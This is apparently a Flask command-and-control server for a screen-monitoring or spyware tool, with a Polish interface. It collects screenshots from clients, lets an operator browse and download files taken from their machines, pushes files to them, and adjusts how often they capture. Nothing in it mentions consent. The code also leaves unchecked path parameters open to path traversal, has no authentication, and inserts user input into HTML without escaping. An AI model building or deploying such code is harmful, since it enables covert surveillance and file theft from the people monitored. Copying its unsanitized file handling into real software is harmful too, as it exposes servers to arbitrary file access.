from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
import os
import datetime
import json

app = Flask(__name__)
UPLOAD_FOLDER = "screens"
COMMAND_FOLDER = "commands"
FILES_FOLDER = "remote_files"
UPLOADS_TO_CLIENTS = "uploaded_files"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMMAND_FOLDER, exist_ok=True)
os.makedirs(FILES_FOLDER, exist_ok=True)
os.makedirs(UPLOADS_TO_CLIENTS, exist_ok=True)

@app.route("/")
def index():
    users = os.listdir(UPLOAD_FOLDER)
    users = [u for u in users if os.path.isdir(os.path.join(UPLOAD_FOLDER, u))]
    links = "".join([f'<li><a href="/view?user={u}">{u}</a> | <a href="/files?user={u}">Pliki</a> | <a href="/upload_file?user={u}">Wyślij plik</a></li>' for u in users])
    return f"<h1>Dostępni użytkownicy</h1><ul>{links}</ul>"

@app.route("/files")
def files():
    user = request.args.get("user")
    path = request.args.get("path", "")
    base_path = os.path.join(FILES_FOLDER, user)
    full_path = os.path.join(base_path, path)

    if not os.path.exists(full_path):
        return "Ścieżka nie istnieje", 404

    entries = os.listdir(full_path)
    content = f"<h1>Pliki: {user} - {path or '/'} </h1><ul>"
    if path:
        parent = os.path.dirname(path.rstrip("/"))
        content += f'<li><a href="/files?user={user}&path={parent}">[..]</a></li>'
    for e in entries:
        p = os.path.join(path, e).replace("\\", "/")
        fpath = os.path.join(full_path, e)
        if os.path.isdir(fpath):
            content += f'<li>[<b>DIR</b>] <a href="/files?user={user}&path={p}">{e}</a></li>'
        else:
            content += f'<li><a href="/download?user={user}&path={p}">{e}</a></li>'
    content += "</ul>"
    return content

@app.route("/download")
def download():
    user = request.args.get("user")
    path = request.args.get("path")
    full_path = os.path.join(FILES_FOLDER, user, path)
    if not os.path.exists(full_path):
        return "Nie znaleziono pliku", 404
    return send_file(full_path, as_attachment=True)

@app.route("/upload_file", methods=['GET', 'POST'])
def upload_file():
    user = request.args.get("user")
    user_folder = os.path.join(UPLOADS_TO_CLIENTS, user)
    os.makedirs(user_folder, exist_ok=True)

    if request.method == 'POST':
        uploaded_file = request.files['file']
        if uploaded_file.filename:
            filepath = os.path.join(user_folder, uploaded_file.filename)
            uploaded_file.save(filepath)
            return f"Plik {uploaded_file.filename} został przesłany do użytkownika {user}."

    return f'''
        <h1>Wyślij plik do użytkownika: {user}</h1>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" />
            <input type="submit" value="Wyślij" />
        </form>
    '''

@app.route("/uploaded_files/<user>/<filename>")
def uploaded_file(user, filename):
    path = os.path.join(UPLOADS_TO_CLIENTS, user, filename)
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return "Nie znaleziono pliku", 404

@app.route("/latest")
def latest():
    user = request.args.get("user")
    user_folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(user_folder):
        return "Nie znaleziono użytkownika.", 404
    files = sorted(os.listdir(user_folder))
    if not files:
        return "Brak screenów.", 404
    return send_file(os.path.join(user_folder, files[-1]), mimetype='image/png')

@app.route("/upload", methods=['POST'])
def upload():
    user = request.form.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    user_folder = os.path.join(UPLOAD_FOLDER, user)
    os.makedirs(user_folder, exist_ok=True)

    file = request.files['screenshot']
    now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{now}.png"
    filepath = os.path.join(user_folder, filename)
    file.save(filepath)
    return "OK"

@app.route("/command", methods=['GET', 'POST'])
def command():
    user = request.args.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    command_path = os.path.join(COMMAND_FOLDER, f"{user}.json")

    if request.method == 'POST':
        action = request.form.get("action")
        data = {}
        if os.path.exists(command_path):
            with open(command_path, "r") as f:
                data = json.load(f)

        if action == "pause":
            data["paused"] = True
        elif action == "resume":
            data["paused"] = False
        elif action == "faster":
            data["interval"] = max(1, data.get("interval", 5) - 1)
        elif action == "slower":
            data["interval"] = data.get("interval", 5) + 1
        elif action == "one_shot":
            data["one_shot"] = True
        elif action == "clear_one_shot":
            data.pop("one_shot", None)

        with open(command_path, "w") as f:
            json.dump(data, f)

        return "OK"
    else:
        if not os.path.exists(command_path):
            return jsonify({"paused": False, "interval": 5})
        with open(command_path, "r") as f:
            return jsonify(json.load(f))

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
